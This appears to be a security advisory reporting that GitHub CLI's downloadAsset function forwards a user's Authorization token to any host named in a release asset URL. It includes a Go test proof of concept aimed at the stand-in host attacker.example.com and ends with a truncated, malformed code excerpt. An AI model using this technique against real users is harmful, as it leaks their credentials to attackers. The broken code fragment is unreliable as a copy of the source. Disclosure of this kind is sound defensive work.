### Title
Token leakage to attacker-controlled host via unpinned `asset.APIURL` in `downloadAsset` - (`pkg/cmd/extension/http.go`)

### Summary
`downloadAsset` builds a plain `http.Request` from the `assetURL` argument and sends it with the shared authenticated `httpClient` via `httpClient.Do(req)`, with no host check comparing the asset URL's host against the repository's host before the request is made. Because `assetURL` is derived from `asset.APIURL`, a field taken verbatim from the release JSON returned by the GitHub API for the target repo, a malicious repository owner can publish a release whose asset `url` field points at an attacker-controlled server, causing the CLI to send its authenticated request (with the victim's `Authorization` header, attached by the shared `httpClient`'s transport) to that foreign host.

### Finding Description
`downloadAsset` is called from the extension install flow as `downloadAsset(httpClient, safeurl.NewImmutableSafeURL(asset.APIURL), destPath)`, where `asset.APIURL` is the `url` field of a `releaseAsset` struct populated directly from the release JSON fetched via `fetchLatestRelease`/`fetchReleaseFromTag`. [1](#0-0) [1](#0-0) 

Inside `downloadAsset`, the code constructs the request directly from `assetURL.String()` and dispatches it through the caller-supplied `httpClient` with no verification that the URL's host matches the repository's host (`baseRepo.RepoHost()`) that was used to authenticate/fetch the release: [2](#0-1) 

Unlike `fetchLatestRelease`/`fetchReleaseFromTag`/`repoExists`, which go through `safeurl.JoinPath`/`safeurl.JoinPathWithHostPrefix` scoped to `baseRepo.RepoHost()` or through `api.NewClientFromHTTP(httpClient).REST(baseRepo.RepoHost(), ...)` (which is host-aware), `downloadAsset` uses a raw `http.NewRequest` + `httpClient.Do` pattern with a URL string taken entirely from API response data, not reconstructed from `baseRepo.RepoHost()`. `safeurl.NewImmutableSafeURL` (per its use here) only wraps the string to make it immutable/prevent further mutation-based injection — it does not enforce that the host matches the extension's repo host. Because the same `httpClient` instance (already carrying the victim's `Authorization`/OAuth header for `baseRepo.RepoHost()`) is reused for this request without any host allowlist check, whatever host `asset.APIURL` designates receives that header.

### Impact Explanation
This matches GitHub's "credential/token disclosure to third party" bounty impact class: an attacker who can publish a release (an unprivileged, ordinary GitHub action) can exfiltrate the victim's GitHub API token/OAuth credential to an attacker-controlled server whenever the victim runs `gh extension install <attacker-repo>` or upgrades an installed malicious extension.

### Likelihood Explanation
Feasible and repeatable: any attacker capable of publishing a public repository release (extension repos are ordinary public repos) can set the `assets[].url` (`browser_download_url`/API `url`) field arbitrarily by crafting the release payload (e.g., via GitHub Releases API against their own repo, or by controlling a GitHub Enterprise-like host the victim points `gh` at). No victim interaction beyond a normal `gh extension install` is required.

### Recommendation
Before calling `downloadAsset`, validate that the parsed host of `asset.APIURL` equals `baseRepo.RepoHost()` (or the configured `ghinstance` host) and reject/strip the Authorization header otherwise; alternatively, always reconstruct the asset URL via `safeurl.JoinPathWithHostPrefix(ghinstance.RESTPrefix(baseRepo.RepoHost()), ...)` rather than trusting the API-provided `url` field verbatim, and/or use a `http.Client` transport that strips `Authorization` on cross-host redirects/requests.

### Proof of Concept
```go
func TestDownloadAssetDoesNotLeakTokenToForeignHost(t *testing.T) {
    var gotAuthHeader string
    var gotHost string

    client := &http.Client{
        Transport: roundTripFunc(func(req *http.Request) (*http.Response, error) {
            gotHost = req.URL.Host
            gotAuthHeader = req.Header.Get("Authorization")
            return &http.Response{
                StatusCode: 200,
                Body:       io.NopCloser(strings.NewReader("data")),
                Header:     make(http.Header),
            }, nil
        }),
    }
    // simulate the shared authenticated client attaching a token to every outgoing request
    client.Transport = addAuthHeader(client.Transport, "token VICTIM_TOKEN")

    foreignURL := safeurl.NewImmutableSafeURL("https://attacker.example.com/steal")
    err := downloadAsset(client, foreignURL, t.TempDir()+"/out")
    require.NoError(t, err)

    require.Equal(t, "attacker.example.com", gotHost)
    require.Empty(t, gotAuthHeader, "Authorization header must not be sent to a foreign host")
}
```
Expected (current) result: `gotAuthHeader` is non-empty and `gotHost` is `attacker.example.com`, demonstrating the token is sent cross-host — confirming the vulnerability.

func downloadAsset(httpClient *http.Client, assetURL safeurl.SafeURL, destPath string) (downloadErr error) {
	var req *http.Request
	if req, downloadErr = http.NewRequest("GET", assetURL.String(), nil); downloadErr != nil {
		return
	}

	req.Header.Set("Accept", "application/octet-stream")

	var resp *http.Response
	// TODO(api-client-rollout)
	// This has been deferred from moving to api.Client due to its custom Accept header and binary response streaming.

		return
	}
